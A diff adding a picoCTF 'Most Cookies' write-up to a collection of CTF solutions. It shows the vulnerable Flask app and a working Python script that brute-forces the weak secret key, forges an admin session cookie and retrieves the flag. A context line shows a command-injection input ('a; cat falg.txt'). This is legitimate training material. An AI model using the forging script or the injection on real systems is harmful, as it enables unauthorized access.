@@ -221,6 +221,130 @@ BOOM, we just need to send `a; cat falg.txt` and enjoy our points!
 
 Flag: **picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**
 
+## Most Cookies ![p](https://img.shields.io/badge/Points-150-success) ![c](https://img.shields.io/badge/Web-purple)
+> Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://mercury.picoctf.net:44693/
+
+I guess you are wrong, at least if the secrect key is easy to retrieve, take a look at the source code:
+```python
+from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
+import random
+app = Flask(__name__)
+flag_value = open("./flag").read().rstrip()
+title = "Most Cookies"
+cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+app.secret_key = random.choice(cookie_names)
+
+@app.route("/")
+def main():
+	if session.get("very_auth"):
+		check = session["very_auth"]
+		if check == "blank":
+			return render_template("index.html", title=title)
+		else:
+			return make_response(redirect("/display"))
+	else:
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+@app.route("/search", methods=["GET", "POST"])
+def search():
+	if "name" in request.form and request.form["name"] in cookie_names:
+		resp = make_response(redirect("/display"))
+		session["very_auth"] = request.form["name"]
+		return resp
+	else:
+		message = "That doesn't appear to be a valid cookie."
+		category = "danger"
+		flash(message, category)
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+@app.route("/reset")
+def reset():
+	resp = make_response(redirect("/"))
+	session.pop("very_auth", None)
+	return resp
+
+@app.route("/display", methods=["GET"])
+def flag():
+	if session.get("very_auth"):
+		check = session["very_auth"]
+		if check == "admin":
+			resp = make_response(render_template("flag.html", value=flag_value, title=title))
+			return resp
+		flash("That is a cookie! Not very special though...", "success")
+		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
+	else:
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+if __name__ == "__main__":
+	app.run()
+```
+
+The `app.secret_key = random.choice(cookie_names)` is what should scare most: we have `cookie_names`, so we could forge and bruteforce (by trying with every element of the array) the secret key. But let's keep investigating on the challenge itself.  
+A cool thing to see is in `/display`: if `very_auth` is `admin` the flag will be shown. Just to be sure, I looked at the cookies from the website and saw a `session` one, with `eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YaYtFQ.gZ6X730fs_kWWAeda1trQxslKpI`.
+
+A Flask cookie structure is `session data (base64)` + `timestamp` + `hash`
+
+By decoding the first part we can see `{"very_auth":"blank"}`, so this is what we expected, and we have to modify this in order to have `admin` as value. Thanks to  [this](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) article I found out how to do that in Python, and I modified the script to be able to retrieve a session cookie first, find the used key, sign the new cookie and make the right request back to get the flag:
+```python
+import flask
+import hashlib
+import requests
+from flask.json.tag import TaggedJSONSerializer
+from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
+
+base_url = "http://mercury.picoctf.net:44693/"
+s = requests.Session()
+s.get(base_url)
+cookie = (s.cookies).get_dict()
+cookie = cookie['session']
+
+cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+session = {"very_auth" : "admin"}
+secret = ""
+
+for name in cookie_names:
+    try:
+        serializer = URLSafeTimedSerializer(
+            secret_key=name,  
+            salt='cookie-session',
+            serializer=TaggedJSONSerializer(),
+            signer=TimestampSigner,
+            signer_kwargs={
+                'key_derivation' : 'hmac',
+                'digest_method' : hashlib.sha1
+        }).loads(cookie)
+    except BadSignature:
+        continue
+
+    secret = name
+    print("Secret key found: {}".format(secret))    
+
+new_cookie = URLSafeTimedSerializer(
+    secret_key=secret,
+    salt='cookie-session',
+    serializer=TaggedJSONSerializer(),
+    signer=TimestampSigner,
+    signer_kwargs={
+        'key_derivation' : 'hmac',
+        'digest_method' : hashlib.sha1
+    }
+).dumps(session)
+
+print("New cookie calculated: {}".format(new_cookie))
+
+cookie_dict = {"session": new_cookie}
+r = requests.get(base_url+"/display", cookies=cookie_dict)
+print(r.text)
+```
+
+Flag: **picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}**
+
 # Java Script Kiddie ![p](https://img.shields.io/badge/Points-400-success) ![c](https://img.shields.io/badge/Web-purple)
 > The image link appears broken... https://jupiter.challenges.picoctf.org/problem/17205 or http://jupiter.challenges.picoctf.org:17205
 
